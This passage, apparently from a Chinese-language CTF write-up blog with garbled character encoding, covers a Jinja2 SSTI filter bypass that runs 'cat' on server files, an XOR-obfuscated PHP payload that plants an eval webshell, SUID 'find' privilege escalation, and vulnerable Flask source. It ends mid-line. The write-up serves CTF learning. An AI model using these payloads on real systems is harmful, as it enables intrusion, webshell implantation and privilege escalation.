<h4 id="æ„é€ ç©ºæ ¼"><a href="#æ„é€ ç©ºæ ¼" class="headerlink" title="æ„é€ ç©ºæ ¼"></a>æ„é€ ç©ºæ ¼</h4><p>ç©ºæ ¼å¾ˆå®¹æ˜“æ„é€ ï¼Œåœ¨<code>()|select|string|list)</code>å°±æœ‰è®¸å¤šç©ºæ ¼ï¼Œ,è¿™é‡Œå¤§æ¦‚è§£é‡Šä¸€ä¸‹**()|select|string|list)**è¿™ç§å½¢å¼æ˜¯ä»€ä¹ˆæ„æ€ï¼Œç®¡é“ç¬¦ï¼Œå‰ä¸€ä¸ªè¾“å‡ºå½“ä½œåä¸€ä¸ªè¾“å…¥ï¼Œå°±åƒ<code>list(string(select(())))</code></p>
<h4 id="æ„é€ åæ–œæ "><a href="#æ„é€ åæ–œæ " class="headerlink" title="æ„é€ åæ–œæ "></a>æ„é€ åæ–œæ </h4><h3 id="æ€è·¯ä¸€"><a href="#æ€è·¯ä¸€" class="headerlink" title="æ€è·¯ä¸€"></a>æ€è·¯ä¸€</h3><p>()|select|string|list)ä¸­æ²¡æœ‰åæ–œæ ï¼Œé‚£ä¹ˆå°±æƒ³ä¸€ä¸‹ï¼š<strong>è¿˜æœ‰å…¶ä»–å…³é”®å­—å¯ä»¥ä»¥è¿™ç§å½¢å¼æ„é€ å­—ç¬¦å—ï¼Ÿ</strong>ï¼Œè€Œå…¶ä»–å…³é”®å­—æ„é€ çš„å­—ç¬¦ä¸‹å¯èƒ½æœ‰æˆ‘ä»¬éœ€è¦çš„åæ–œæ ï¼Œç­”æ¡ˆæ˜¯è‚¯å®šçš„</p>
<p>è¿˜æœ‰å¾ˆå¤š</p>
<ol>
<li><code>config|string|list</code></li>
<li><code>request|string|list</code></li>
<li><code>lipsum|string|list</code></li>
<li>â€¦â€¦</li>
</ol>
<p>æ¯”å¦‚configå’Œrequestä¸‹å°±æœ‰åæ–œæ ï¼Œä½†æ˜¯è¢«é»‘åå•äº†ï¼Œæˆ‘è¿™é‡Œæš‚æ—¶è¿˜æ²¡æœ‰æ‰¾åˆ°å…¶ä»–ä¸å¤ªé»‘åå•ä¸‹æœ‰å¯ä»¥æ„é€ åæ–œæ çš„ï¼Œåªèƒ½æ¢æ€è·¯äº†</p>
<h3 id="æ€è·¯äºŒ"><a href="#æ€è·¯äºŒ" class="headerlink" title="æ€è·¯äºŒ"></a>æ€è·¯äºŒ</h3><p>åˆ©ç”¨æ ¼å¼å­—ç¬¦ä¸²å¾—åˆ°åæ–œæ ï¼Œ</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">set</span> fxg=(<span class="string">&quot;%c&quot;</span>%(<span class="number">47</span>))%&#125;</span><br><span class="line">&#123;%<span class="built_in">print</span>(fxg)%&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#/</span></span><br></pre></td></tr></table></figure>

<p>è¦åˆ©ç”¨æ ¼å¼å­—ç¬¦ä¸²éœ€è¦ç”¨åˆ°ç™¾åˆ†å·ï¼Œé‚£ä¹ˆéœ€è¦æ„é€ ç™¾åˆ†å·:å°†å­—ç¬¦urlç¼–ç å–ç¬¬ä¸€ä¸ªå­—ç¬¦ï¼Œç¬¬ä¸€ä¸ªå­—ç¬¦è‚¯å®šæ˜¯<code>%</code>,</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> bfh = ()|select|string|urlencode|first %&#125; </span><br></pre></td></tr></table></figure>

<p>è€Œç„¶å¹¶æ²¡æœ‰æˆ‘æƒ³çš„é‚£ä¹ˆç®€å•ï¼Œ<code>url</code>å±…ç„¶è¢«è¿‡æ»¤äº†ï¼Œè¿™ç§æ€è·¯åˆæ— æ³•ç”¨äº†</p>
<h3 id="æ€è·¯ä¸‰"><a href="#æ€è·¯ä¸‰" class="headerlink" title="æ€è·¯ä¸‰"></a>æ€è·¯ä¸‰</h3><p>å›é¡¾ä¸€ä¸‹ï¼Œ</p>
<ol>
<li><p>æˆ‘ä»¬æ˜¯æƒ³è¦å¾—åˆ°åæ–œæ ï¼›</p>
</li>
<li><p>æˆ‘ä»¬å·²ç»å¯ä»¥åœ¨å½“å‰ç›®å½•ä¸‹æ‰§è¡Œå‘½ä»¤äº†ï¼Œä¸Šé¢å±•ç¤ºçš„å°±æœ‰<code>ls</code>ï¼›</p>
</li>
</ol>
<p>çªç„¶æƒ³èµ·æ¥å½“å‰ç›®å½•æœ‰app.pyæ–‡ä»¶ï¼Œç”¨çš„æ˜¯flaskæ¡†æ¶ï¼Œè‚¯å®šä¼šæœ‰è·¯ç”±ï¼Œæœ‰è·¯ç”±è‚¯å®šä¼šç”¨åˆ°åæ–œæ ;ç°åœ¨æ€è·¯æ¯”è¾ƒç®€å•äº†ï¼šä»app.pyæ–‡ä»¶ä¸­å¾—åˆ°åæ–œæ ï¼›</p>
<p>åˆ—å¦‚ä¸‹æ®µflaskä»£ç ä¸­è‚¯å®šä¼šå­˜åœ¨åæ–œæ ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(): </span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>) </span><br></pre></td></tr></table></figure>



<p>éœ€è¦<code>cat app.py</code>,å­—æ¯å’Œç©ºæ ¼éƒ½æœ‰äº†ï¼Œç°åœ¨æ„é€ <code>.</code>åˆæˆäº†ä¸€ä¸ªéš¾ç‚¹ï¼Œä½†è¿˜æ˜¯æœ‰æ–¹æ³•çš„</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">print</span>(g)%&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#&lt;flask.g of &#x27;app&#x27;&gt;</span></span><br><span class="line"></span><br><span class="line">&#123;% <span class="built_in">set</span> po=<span class="built_in">dict</span>(po=a,p=b)|join%&#125; </span><br><span class="line">&#123;% <span class="built_in">set</span> dian=(g|string|<span class="built_in">list</span>)|attr(po)(<span class="number">6</span>)%&#125;</span><br><span class="line">&#123;%<span class="built_in">print</span>(dian)%&#125;</span><br><span class="line"><span class="comment">#.</span></span><br></pre></td></tr></table></figure>

<p>okï¼Œè¿™æ ·æ‰€éœ€è¦çš„å­—ç¬¦éƒ½æ„é€ å‡ºæ¥äº†ï¼Œå‰©ä¸‹çš„å°±æ˜¯åˆ©ç”¨äº†</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> po=<span class="built_in">dict</span>(po=a,p=b)|join%&#125; </span><br><span class="line">&#123;% <span class="built_in">set</span> a=(()|select|string|<span class="built_in">list</span>)|attr(po)(<span class="number">24</span>)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> ini=(a,a,<span class="built_in">dict</span>(<span class="keyword">in</span>=a,it=b)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> glo=(a,a,<span class="built_in">dict</span>(glo=a,bals=b)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> cls=(a,a,<span class="built_in">dict</span>(cla=a,ss=b)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> bs=(a,a,<span class="built_in">dict</span>(bas=a,e=b)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> geti=(a,a,<span class="built_in">dict</span>(get=a)|join,<span class="built_in">dict</span>(item=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> subc=(a,a,<span class="built_in">dict</span>(subcla=a,sses=b)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> pp=<span class="built_in">dict</span>(po=a,pen=b)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> re=<span class="built_in">dict</span>(re=a,ad=b)|join%&#125;</span><br><span class="line"></span><br><span class="line">&#123;% <span class="built_in">set</span> kon=(()|select|string|<span class="built_in">list</span>)|attr(po)(<span class="number">17</span>)%&#125; </span><br><span class="line">&#123;% <span class="built_in">set</span> dian=(g|string|<span class="built_in">list</span>)|attr(po)(<span class="number">6</span>)%&#125;   	</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;% <span class="built_in">set</span> qian=<span class="built_in">dict</span>(p=a)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> hou=<span class="built_in">dict</span>(p=a,y=b)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> ming=(kon,kon,<span class="built_in">dict</span>(ap=a,p=b)|join,dian,hou)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> cmd=(<span class="built_in">dict</span>(ca=a,t=b)|join,ming)|join()%&#125;</span><br><span class="line"></span><br><span class="line">&#123;% <span class="built_in">set</span> a=()|attr(cls)|attr(bs)|attr(subc)()|attr(geti)(<span class="number">117</span>)|attr(ini)|attr(glo)|attr(geti)(pp)(cmd)|attr(re)()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> bb=(a|string|<span class="built_in">list</span>)|attr(po)(<span class="number">246</span>)%&#125;</span><br><span class="line"></span><br><span class="line">&#123;% <span class="built_in">set</span> ho=(<span class="built_in">dict</span>(ap=a,p=b))|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> fl=(<span class="built_in">dict</span>(fl4gfl4g=a,fl4g=b))|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span>  cmd=(<span class="built_in">dict</span>(ca=a,t=b)|join,kon,bb,ho,bb,fl)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">print</span>(()|attr(cls)|attr(bs)|attr(subc)()|attr(geti)(<span class="number">117</span>)|attr(ini)|attr(glo)|attr(geti)(pp)(cmd)|attr(re)())%&#125;</span><br></pre></td></tr></table></figure>





<h2 id="EzRce"><a href="#EzRce" class="headerlink" title="EzRce"></a>EzRce</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;waf.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$data</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">waf</span>(<span class="variable">$data</span>))&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$data</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;no!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å…ˆç”¨bp fuzzä¸€ä¸‹ï¼Œçœ‹çœ‹è¿‡æ»¤äº†ä»€ä¹ˆï¼Œå‘ç°å¼‚æˆ–ç¬¦å·æ²¡æœ‰è¿‡æ»¤ï¼Œè€Œä¸”æœ‰å‡ ä¸ªå­—æ¯æ²¡æœ‰è¿‡æ»¤</p>
<p>ä¸‹é¢æ˜¯ä¸Šäº†æœ¨é©¬æ‰å¾—åˆ°æºç çš„</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123; </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[b-df-km-uw-z0-9\+\~\&#123;\&#125;]+/i&#x27;</span>,<span class="variable">$data</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> False;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> True;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="å¼‚æˆ–ä¸ŠğŸ"><a href="#å¼‚æˆ–ä¸ŠğŸ" class="headerlink" title="å¼‚æˆ–ä¸ŠğŸ"></a>å¼‚æˆ–ä¸ŠğŸ</h3><p>å› ä¸ºæ²¡æœ‰è¿‡æ»¤å¼‚æˆ–æ‰€ä»¥æ„é€ phpinfo(); : (â€œ^@^@@[@â€^â€.(.).&#x3D;&#x2F;â€œ)();</p>
<p>å‘ç°æ˜¯å¯ä»¥æˆåŠŸæ˜¾ç¤ºphpinfoå†…å®¹ï¼Œä½†æ˜¯æŸ¥çœ‹disable_functionsç¦ç”¨äº†ä¸€äº›å‡½æ•°ï¼Œä½†æ˜¯æ²¡æœ‰ç¦ç”¨file_put_contentså‡½æ•°ï¼Œå°è¯•å†™ä¸€å¥è¯æœ¨é©¬ä¸Šå»</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file_put_content(&quot;lll.php&quot;,&quot;&lt;?php eval($_POST[1])?&gt;&quot;)</span><br><span class="line"></span><br><span class="line">(&quot;AAAAaL*VaAAAVAAVL&quot;^&quot;&#x27;(-$&gt;&lt;_\&quot;&gt;\&quot;./\&quot;$/\&quot;?&quot;)(&quot;lll&quot;.&quot;.&quot;.(&quot;LAL&quot;^&quot;&lt;)&lt;&quot;),(&quot;aaLALaaAVAAvaalalvelaleaa&quot;^&quot;]^&lt;)&lt;A!$  -^E&gt;&lt;.?\&quot;&gt;]&lt;E^^_&quot;));</span><br></pre></td></tr></table></figure>

<p>å‘ç°ä¹Ÿæ˜¯æˆåŠŸä¸Šä¼ äº†æœ¨é©¬ï¼Œç”¨èšå‰‘è¿shell(è¿™é‡Œæœ‰ä¸€ä¸ªå‘,httpsæ²¡æœ‰æˆåŠŸï¼Œç”¨httpä»£æ›¿å°±å¯ä»¥äº†)</p>
<h3 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h3><p>å¯ä»¥çœ‹åˆ°flagå°±åœ¨æ ¹ç›®å½•ä¸‹ï¼Œä½†æ˜¯æ²¡æœ‰æƒé™è¯»å–ï¼Œwhoami æŸ¥çœ‹å½“å‰ç”¨æˆ·www-dataï¼Œå»ç½‘ä¸Šæœä¸€æ¬¡å…³äºææƒçš„çŸ¥è¯†ï¼Œ</p>
<p>ææƒçš„æ–¹æ³•æœ‰å¾ˆå¤šï¼Œè¿™é“é¢˜è€ƒçš„æ˜¯findææƒï¼Œ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">which find </span><br><span class="line">#/usr/bin/find</span><br><span class="line"></span><br><span class="line">ls /usr/bin/find -l</span><br><span class="line">#-rwsr-xr-x. 1 root root 315904 Feb 16  2019 /usr/bin/find</span><br><span class="line">#è¿™é‡Œå‘ç°æœ‰sæƒé™ s:suodsetuidï¼šè¯¥ä½æ˜¯è®©æ™®é€šç”¨æˆ·å¯ä»¥ä»¥rootç”¨æˆ·çš„è§’è‰²è¿è¡Œåªæœ‰rootå¸å·æ‰èƒ½è¿è¡Œçš„ç¨‹åºæˆ–å‘½ä»¤</span><br><span class="line"></span><br><span class="line"> find /etc/passwd -exec cat /flag \;</span><br><span class="line"> #find ä¸€ä¸ªå¿…é¡»å­˜åœ¨çš„æ–‡ä»¶ -exec æœ‰æ‰§è¡Œçš„å‘½ä»¤ \;</span><br></pre></td></tr></table></figure>

<p>åˆ°è¿™é‡Œflagå°±å·²ç»åˆ°æ‰‹äº†ï¼Œè¸©äº†å¾ˆå¤šå‘ï¼Œè¿˜æœ‰ä¸€äº›å‘æ²¡æœ‰å†™ä¸Šäº†ï¼Œä¹Ÿæ˜¯æ‹¿äº†ä¸€ä¸ªä¸‰è¡€ï¼Œä¸‹é¢æ˜¯å¼‚æˆ–çš„è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">valid = <span class="string">&quot;alevALEV!@$%^*()[];\&#x27;\&quot;,.&lt;&gt;/?-=_` &quot;</span></span><br><span class="line"></span><br><span class="line">answer = <span class="built_in">str</span>(<span class="built_in">input</span>(<span class="string">&quot;è¯·è¾“å…¥è¿›è¡Œå¼‚æˆ–æ„é€ çš„å­—ç¬¦ä¸²ï¼š&quot;</span>))</span><br><span class="line"><span class="comment"># answer = &quot;//\/\/&quot;</span></span><br><span class="line">tmp1, tmp2 = <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> answer:</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> valid:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> valid:</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">ord</span>(i) ^ <span class="built_in">ord</span>(j) == <span class="built_in">ord</span>(c)):</span><br><span class="line">        tmp1 += i</span><br><span class="line">        tmp2 += j</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">break</span></span><br></pre></td></tr></table></figure>



<h2 id="ezpython"><a href="#ezpython" class="headerlink" title="ezpython"></a>ezpython</h2><h3 id="æºç -1"><a href="#æºç -1" class="headerlink" title="æºç "></a>æºç </h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> waf <span class="keyword">import</span> waf</span><br><span class="line"><span class="keyword">import</span> importlib</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template,request,redirect,url_for,session,render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key=<span class="string">&#x27;jjjjggggggreekchallenge202333333&#x27;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.username=<span class="string">&quot;&quot;</span></span><br><span class="line">        self.password=<span class="string">&quot;&quot;</span></span><br><span class="line">        self.isvip=<span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">hhh</span>(<span class="title class_ inherited__">User</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.username=<span class="string">&quot;&quot;</span></span><br><span class="line">        self.password=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">registered_users=[]</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():  <span class="comment"># put application&#x27;s code here</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;welcome.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/play&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">play</span>():</span><br><span class="line">    username=session.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> username:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>,name=username)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username=request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        password=request.form.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">        user = <span class="built_in">next</span>((user <span class="keyword">for</span> user <span class="keyword">in</span> registered_users <span class="keyword">if</span> user.username == username <span class="keyword">and</span> user.password == password), <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">if</span> user:</span><br><span class="line">            session[<span class="string">&#x27;username&#x27;</span>] = user.username</span><br><span class="line">            session[<span class="string">&#x27;password&#x27;</span>]=user.password</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;play&#x27;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Invalid login&quot;</span></span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;play&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> waf(request.data):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;fuck payload!Hacker!!!&quot;</span></span><br><span class="line">            data=json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;è¿ç”¨æˆ·åå¯†ç éƒ½æ²¡æœ‰ä½ æ³¨å†Œå•¥å‘¢&quot;</span></span><br><span class="line">            user=hhh()</span><br><span class="line">            merge(data,user)</span><br><span class="line">            registered_users.append(user)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;æ³°é…·è¾£,æ²¡æœ‰æ³¨å†ŒæˆåŠŸæ&quot;</span></span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;register.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    user = <span class="built_in">next</span>((user <span class="keyword">for</span> user <span class="keyword">in</span> registered_users <span class="keyword">if</span> user.username ==session[<span class="string">&#x27;username&#x27;</span>]  <span class="keyword">and</span> user.password == session[<span class="string">&#x27;password&#x27;</span>]), <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> user:</span><br><span class="line">        <span class="keyword">if</span> user.isvip:</span><br><span class="line">            data=request.args.get(<span class="string">&#x27;num&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> data:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;0&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">and</span> data != <span class="string">&quot;123456789&quot;</span> <span class="keyword">and</span> <span class="built_in">int</span>(data) == <span class="number">123456789</span> <span class="keyword">and</span> <span class="built_in">len</span>(data) &lt;=<span class="number">10</span>:</span><br><span class="line">                        flag = os.environ.get(<span class="string">&#x27;geek_flag&#x27;</span>)</span><br><span class="line">                        <span class="keyword">return</span> render_template(<span class="string">&#x27;flag.html&#x27;</span>,flag=flag)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;ä½ çš„æ•°å­—ä¸å¯¹å“¦!&quot;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;I need a num!!!&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template_string(<span class="string">&#x27;è¿™ç§ç¥åŠŸä½ ä¸å……VIPä¹Ÿæƒ³å­¦?&lt;p&gt;&lt;img src=&quot;&#123;&#123;url_for(\&#x27;static\&#x27;,filename=\&#x27;weixin.png\&#x27;)&#125;&#125;&quot;&gt;è¦ä¸væˆ‘50,æˆ‘é€ä½ 